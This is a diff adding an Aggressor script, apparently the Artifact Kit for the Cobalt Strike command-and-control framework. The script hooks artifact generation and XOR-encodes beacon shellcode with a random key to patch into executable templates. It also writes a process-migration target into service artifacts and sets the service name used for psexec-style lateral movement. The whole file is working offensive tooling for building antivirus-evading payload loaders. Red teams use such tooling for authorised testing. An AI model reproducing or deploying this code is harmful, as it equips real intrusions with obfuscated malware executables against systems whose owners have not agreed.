@@ -1,0 +1,363 @@
+################################################
+## ARTIFACT KIT
+
+print_info("Artifact Kit Loaded");
+$artifact_kit_path = iff($artifact_kit_path eq "", script_resource(""), $artifact_kit_path);
+
+# Create a map to track information for the following settings
+# with these keys: service, spawnto_x86, spawnto_x64
+local('%ak_settings $initialized');
+
+# Helper function to validate the spawnto settings
+# Arguments
+#   $1 - $spawnto - string to validate
+#   $2 - $default - default string if validation fails.
+# Returns
+#   The $spawnto string if valid otherwise the $default string.
+sub validate_spawnto {
+   local('$spawnto $default');
+   ($spawnto, $default) = @_;
+
+   if (indexOf($spawnto, "%") ne $null) {
+      print_error("Artifact - The ak-settings does not support environment variables using default.");
+   } else if (strlen($spawnto) > 63) {
+      print_error("Artifact - The spawnto_[x86|x64] value can not exceed 63 characters using default.");
+   } else if (strlen($spawnto) == 0) {
+      print_error("Artifact - The spawnto_[x86|x64] value can not be an empty string using default.");
+   } else {
+      return $spawnto;
+   }
+   return $default;
+}
+
+# Helper function to initialize the settings from the profile
+# which updates the ak_settings map.
+# Arguments
+#   None
+#
+# Returns
+#   Nothing
+sub initialize {
+    local('$profile $spawnto');
+
+    if ($initialized eq "true") {
+       return;
+    }
+
+    # Get access to the profile information.
+    $profile = data_query("metadata")["c2profile"];
+
+    # Initialize the spawnto_x86 value from the profile
+    $spawnto = [$profile getString: ".post-ex.spawnto_x86"];
+    %ak_settings["spawnto_x86"] = validate_spawnto($spawnto, "C:\\Windows\\SysWOW64\\rundll32.exe");
+
+    # Initialize the spawnto_x64 value from the profile
+    $spawnto = [$profile getString: ".post-ex.spawnto_x64"];
+    %ak_settings["spawnto_x64"] = validate_spawnto($spawnto, "C:\\Windows\\System32\\rundll32.exe");
+
+    # Set the service name to empty string, which results in a random 7 character string.
+    %ak_settings["service"] = "";
+
+    $initialized = "true";
+}
+
+# Helper function to return the current settings to either the beacon console
+# $bid is set or to the script console.
+# Arguments
+#   $1 - $bid - beacon id
+#
+# Returns
+#   Nothing
+sub get_settings {
+   local('$bid');
+   ($bid) = @_;
+
+   blog2($bid, "artifact kit settings:");
+   blog2($bid, "   service     = '" . %ak_settings["service"] . "'");
+   blog2($bid, "   spawnto_x86 = '" . %ak_settings["spawnto_x86"] . "'");
+   blog2($bid, "   spawnto_x64 = '" . %ak_settings["spawnto_x64"] . "'");
+}
+
+# Helper function to set the name that will be returned via the PSEXEC_SERVICE hook.
+# Arguments
+#   $1 - $bid   - beacon id
+#   $2 - $value - The name to use for the PSEXEC_SERVICE hook
+#
+# Returns
+#   Nothing
+sub set_service {
+   local('$bid $value');
+   ($bid, $value) = @_;
+
+   blog2($bid, "Updating the psexec service name to \'$value\'");
+   %ak_settings["service"] = $value;
+}
+
+# Helper function to set the spawn process for the specified architecture.
+# Arguments
+#   $1 - $bid   - beacon id
+#   $2 - $arch  - The architecture
+#   $3 - $value - The command to spawn for the specified architecture
+#
+# Returns
+#   Nothing
+sub set_spawnto {
+   local('$bid $arch $value $setting $default $validated');
+   ($bid, $arch, $value) = @_;
+   $setting = "spawnto_$arch";
+
+   $default = iff($arch eq "x64", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\SysWOW64\\rundll32.exe");
+   $validated = validate_spawnto($value, $default);
+
+   if ($value ne $validated) {
+      berror($bid, "Error detected with the $setting value see script console additional information.");
+   }
+   blog2($bid, "Updating the $setting process to \'$validated\'");
+   %ak_settings[$setting] = $validated;
+}
+
+# Alias command to view and set the settings to be used for the artifact kit.
+# Arguments
+#   $1 - $bid     - beacon id
+#   $2 - $setting - (optional) The name of the setting to set
+#   $3 - $setting - (optional) The value for the specified setting
+#
+# Returns
+#   Nothing
+alias ak-settings {
+   local('$bid $setting $value $arch');
+   ($bid, $setting, $value) = @_;
+
+   # Make sure the settings have been initialized.
+   initialize();
+
+   # Set the setting based on the $settings argument.
+   if ($setting eq "service") {
+      set_service($bid, $value);
+   } else if (strlen($setting) == 11 && substr($setting, 0, 8) eq "spawnto_") {
+      $arch = substr($setting, 8);
+      if ($arch eq "x86" || $arch eq "x64") {
+         set_spawnto($bid, $arch, $value);
+      }
+   }
+
+   # display the current settings to the beacon console.
+   get_settings($bid);
+}
+
+# Register the alias so it is available with the help command.
+beacon_command_register(
+   "ak-settings",
+   "Set the artifact kit settings for artifact generation and the jump command for exploits: psexec, psexec64",
+   "Usage: ak-settings [setting] [value]\n\n" .
+   "Set settings to be used for generating artifacts through the artifact kit\n\n" .
+   "Supported settings:\n" .
+   "   service - Set the name to return for the PSEXEC_SERVICE hook.\n" .
+   "   spawnto_[x86|x64] - Set the migration process to use for the service executable artifacts.\n\n" .
+   "Usage Examples:\n" .
+   "   ak-settings service updater\n" .
+   "   ak-settings spawnto_x64 [c:\\path\\to\\whatever.exe]\n\n" .
+   "No arguments will display the current settings.\n"
+);
+
+# Helper function to determine which spawnto setting to return.
+# Arguments
+#   $1 - resource - name of the artifact being generated
+#
+# Returns
+#   The spawnto value for the requested architecture.
+sub get_spawnto {
+   local('$resource $setting');
+   ($resource) = @_;
+
+   # Make sure the settings have been initialized.
+   initialize();
+
+   # The $resource will have 32 or 64 within the name to determine architecture.
+   $setting = iff(indexOf($resource, "64") > 0, "spawnto_x64", "spawnto_x86");
+
+   return %ak_settings[$setting];
+}
+
+# Arguments
+#   $1 - resource - name of the artifact being generated
+#   $2 - data     - executable code of the artifact
+#   $3 - key      - (8 byte XoR)
+sub patch_migration_process {
+
+   local('$resource $data $key $index $buffer $b $zz');
+   ($resource $data, $key) = @_;
+
+   # find the location where the migration process should be patched.
+   # which is marked with 63 Ms
+   $index = indexOf($data, 'M' x 63);
+
+   # Only the service artifacts have this buffer
+   if ($index eq $null) {
+      return $data;
+   }
+
+   # Dealing with a service artifact pack the spawnto value into a buffer.
+   $buffer = allocate(64);
+
+   # Get the spawnto value for the service artifacts to use for migration
+   $spawnto = get_spawnto($resource);
+   if (strlen($spawnto) == 0) {
+       print_error("Artifact - The spawnto setting is not set. Using default.");
+       return $null;
+   }
+   print_info("Artifact - Process migration executable: $spawnto");
+
+   # pack our encoded spawnto into the buffer, make sure it is null terminated, fill in
+   # with random characters if needed.
+   for ($zz = 0; $zz < strlen($spawnto); $zz++) {
+      writeb( $buffer, chr((byteAt($spawnto, $zz) ^ $key[$zz % 8]) & 0xFF) ); # 8 byte XoR
+   }
+   writeb( $buffer, chr($key[$zz % 8] & 0xFF) ); # Null terminate spawnto string
+   for ($zz = $zz + 1; $zz < 64; $zz++) {
+      writeb( $buffer, chr(((int(rand() * 253) + 1) ^ $key[$zz % 8]) & 0xFF)); # Random characters
+   }
+
+   # retrieve the contents of the buffer.
+   closef($buffer);
+   $b = readb($buffer, -1);
+
+   # return the patched artifact
+   return replaceAt($data, "$[64]b", $index);
+}
+
+# Hook that is called to get the service name.
+set PSEXEC_SERVICE {
+   $service = %ak_settings["service"];
+   if (strlen($service) == 0) {
+      print_info("Artifact - PSEXEC_SERVICE service name: [7 random characters]");
+   } else {
+      print_info("Artifact - PSEXEC_SERVICE service name: $service");
+   }
+   return $service;
+}
+
+# Windows Executables and DLLs
+#
+# Arguments
+#  $1 - $resource - artifact file (e.g., artifact32.exe)
+#  $2 - $payload  - shellcode for beacon
+#
+# Return 
+#  our generated artifact
+#
+set EXECUTABLE_ARTIFACT_GENERATOR {
+
+   print_info("Artifact - EXECUTABLE_ARTIFACT_GENERATOR hook");
+
+   #NOTE: This script must match the settings in the compiled artifact kit
+   #      Refer to patch.c and patch.h for the PHEAR struct
+
+   local('$artifact_object $arch $handle $data $key $index $payload $payload_size $resource $buffer $b $zz $spawnto');
+
+   ($resource, $payload) = @_;
+   $payload_size = strlen($payload);
+   $artifact_object = getFileProper($artifact_kit_path, $resource);
+   print_info("Artifact - " . $artifact_object);
+
+   # try again or use the default artifact... I don't have it!
+
+   if (!-exists $artifact_object) {
+      print_error("Artifact - Failed to load custom artifact. Using default.");
+      return $null;
+   }
+
+   # read in the executable template
+   $handle = openf($artifact_object);
+
+   $data = readb($handle, -1);
+   closef($handle);
+
+   # generate a random 8 Byte XoR key
+   $key = @();
+   $key[0] = int(rand() * 253) + 1;
+   $key[1] = int(rand() * 253) + 1;
+   $key[2] = int(rand() * 253) + 1;
+   $key[3] = int(rand() * 253) + 1;
+   $key[4] = int(rand() * 253) + 1;
+   $key[5] = int(rand() * 253) + 1;
+   $key[6] = int(rand() * 253) + 1;
+   $key[7] = int(rand() * 253) + 1;
+
+   # Patch in the migration process name, check for $null in case of error
+   $data = patch_migration_process($resource, $data, $key);
+   if ($data eq $null) {
+      return $null;
+   }
+
+   # find the location of our data in the executable
+   $index = indexOf($data, 'A' x 1024);
+
+   ## PHEAR STRUCT Reference
+   # typedef struct {
+   #     int  offset;
+   #     int  length;
+   #     char key[8]; // 8 byte XoR
+   #     int  gmh_offset;
+   #     int  gpa_offset;
+   #     char payload[DATA_SIZE];
+   # } phear;
+
+   # pack data into a buffer
+   $buffer = allocate(1024);
+
+   # [offset of payload data in binary + offset of payload in the phear structure] - 4 bytes
+   writeb($buffer, pack("i-", $index + 24));
+
+   # [length of payload] - 4 bytes
+   writeb($buffer, pack("i-", $payload_size));
+
+   # [xor key] - 8 bytes
+   writeb($buffer, chr($key[0]) );
+   writeb($buffer, chr($key[1]) );
+   writeb($buffer, chr($key[2]) );
+   writeb($buffer, chr($key[3]) );
+   writeb($buffer, chr($key[4]) );
+   writeb($buffer, chr($key[5]) );
+   writeb($buffer, chr($key[6]) );
+   writeb($buffer, chr($key[7]) );
+
+   # [ bootstrap hint offsets ] - 8 bytes
+   # write our pointer offsets to allow the agent to bootstrap itself
+   # without walking the kernel32 Export Address Table
+   #
+   # Some shellcodes don't support this hint; so we need to check.
+   #
+   if (-hasbootstraphint $payload) {
+      writeb($buffer, pack("i-", payload_bootstrap_hint($payload, "GetModuleHandleA")));
+      writeb($buffer, pack("i-", payload_bootstrap_hint($payload, "GetProcAddress")));
+   }
+   else {
+      writeb($buffer, pack("i-", 0));
+      writeb($buffer, pack("i-", 0));
+   }
+
+   # [ encoded payload ] - payload length bytes
+   # pack our encoded payload into the buffer
+   for ($zz = 0; $zz < $payload_size; $zz++) {
+      writeb( $buffer, chr( (byteAt($payload, $zz) ^ $key[$zz % 8]) & 0xFF ) ); # 8 byte XoR
+   }
+
+   # retrieve the contents of the buffer.
+   closef($buffer);
+   $b = readb($buffer, -1);
+
+   if ($payload_size > __STAGE_SIZE__) {
+      local('$error');
+      $error = "Artifact - Payload size of $payload_size bytes does not fit into the artifact buffer size of __STAGE_SIZE__ bytes";
+      print_error($error);
+      show_error($error);
+   }
+   else {
+      print_info("Artifact - Patching the artifact with the payload size of $payload_size bytes");
+   }
+
+   # return our encoded shellcode.
+   return replaceAt($data, "$[1024]b", $index);
+}
+
